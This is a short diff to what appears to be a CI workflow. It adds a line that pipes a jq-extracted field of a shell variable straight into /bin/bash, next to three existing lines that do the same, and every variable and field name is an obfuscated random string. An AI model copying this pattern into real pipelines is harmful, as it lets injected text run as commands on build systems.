@@ -21,6 +21,7 @@ jobs:
           echo $wp314 | jq -r .m7473 | /bin/bash
           printf '%s' "$mceg54" | jq -r .pfcq7 | /bin/bash
           echo $nto8483 | jq -r .vfc38464 | /bin/bash
+          printf '%s' "$u1" | jq -r .cvizl8 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
